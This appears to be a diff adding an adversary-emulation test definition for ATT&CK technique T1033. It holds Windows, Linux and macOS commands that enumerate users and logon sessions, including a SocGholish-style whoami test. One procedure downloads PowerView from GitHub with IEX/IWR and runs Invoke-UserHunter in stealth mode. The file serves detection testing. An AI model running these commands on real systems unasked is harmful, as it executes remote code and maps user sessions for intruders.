@@ -1,0 +1,130 @@
+{
+  "attack_technique": "T1033",
+  "display_name": "System Owner/User Discovery",
+  "atomic_tests": [
+    {
+      "name": "System Owner/User Discovery",
+      "description": "Identify System owner or users on an endpoint.\n\nUpon successful execution, cmd.exe will spawn multiple commands against a target host to identify usernames. Output will be via stdout. \nAdditionally, two files will be written to disk - computers.txt and usernames.txt.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "procedure": "cmd.exe /C whoami\nwmic useraccount get /ALL\nquser /SERVER:\"#{computer_name}\"\nquser\nqwinsta.exe /server:#{computer_name}\nqwinsta.exe\nfor /F \"tokens=1,2\" %i in ('qwinsta /server:#{computer_name} ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt\n@FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "computer_name",
+          "description": "Name of remote computer",
+          "type": "string",
+          "default": "localhost"
+        }
+      ],
+      "auto_generated_guid": "4c4959bf-addf-4b4a-be86-8d09cc1857aa"
+    },
+    {
+      "name": "System Owner/User Discovery",
+      "description": "Identify System owner or users on an endpoint\n\nUpon successful execution, sh will stdout list of usernames.",
+      "supported_platforms": [
+        "linux",
+        "macos"
+      ],
+      "executor": {
+        "name": "sh",
+        "elevation_required": false,
+        "procedure": "users\nw\nwho"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "2a9b677d-a230-44f4-ad86-782df1ef108c"
+    },
+    {
+      "name": "Find computers where user has session - Stealth mode (PowerView)",
+      "description": "Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "procedure": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "29857f27-a36f-4f7e-8084-4557cd6207ca"
+    },
+    {
+      "name": "User Discovery With Env Vars PowerShell Script",
+      "description": "Use the PowerShell environment variables to identify the current logged user.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "cleanup_command": "Remove-Item -Path .\\CurrentactiveUser.txt -Force",
+        "procedure": "[System.Environment]::UserName | Out-File -FilePath .\\CurrentactiveUser.txt \n$env:UserName | Out-File -FilePath .\\CurrentactiveUser.txt -Append"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "dcb6cdee-1fb0-4087-8bf8-88cfd136ba51"
+    },
+    {
+      "name": "GetCurrent User with PowerShell Script",
+      "description": "Use the PowerShell \"GetCurrent\" method of the WindowsIdentity .NET class to identify the logged user.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "cleanup_command": "Remove-Item -Path .\\CurrentUserObject.txt -Force",
+        "procedure": "[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\\CurrentUserObject.txt"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "1392bd0f-5d5a-429e-81d9-eb9d4d4d5b3b"
+    },
+    {
+      "name": "System Discovery - SocGholish whoami",
+      "description": "SocGholish performs whoami discovery commands and outputs the results to a tmp file. \nThe test will generate a filename similar to the random one generated during execution and write the file to AppData\\Temp.\n\nReference: https://redcanary.com/threat-detection-report/threats/socgholish/",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "cleanup_command": "Remove-Item -Path #{output_path}\\rad*.tmp -Force",
+        "procedure": "$TokenSet = @{\n  U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\n  N = [Char[]]'0123456789'\n}\n$Upper = Get-Random -Count 5 -InputObject $TokenSet.U\n$Number = Get-Random -Count 5 -InputObject $TokenSet.N\n$StringSet = $Upper + $Number\n$rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''\n$file = \"rad\" + $rad + \".tmp\"\n\nwhoami.exe /all >> #{output_path}\\$file"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "output_path",
+          "description": "Location of output file",
+          "type": "string",
+          "default": "$env:temp"
+        }
+      ],
+      "auto_generated_guid": "3d257a03-eb80-41c5-b744-bb37ac7f65c7"
+    },
+    {
+      "name": "System Owner/User Discovery Using Command Prompt",
+      "description": "Identify the system owner or current user using native Windows command prompt utilities.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "cleanup_command": "del #{output_file_path}\\\\user_info_*.tmp",
+        "procedure": "set file=#{output_file_path}\\user_info_%random%.tmp\necho Username: %USERNAME% > %file%\necho User Domain: %USERDOMAIN% >> %file%\nnet users >> %file%\nquery user >> %file%"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "output_file_path",
+          "description": "Location of output file.",
+          "type": "string",
+          "default": "$env:temp"
+        }
+      ],
+      "auto_generated_guid": "ba38e193-37a6-4c41-b214-61b33277fe36"
+    }
+  ]
+}
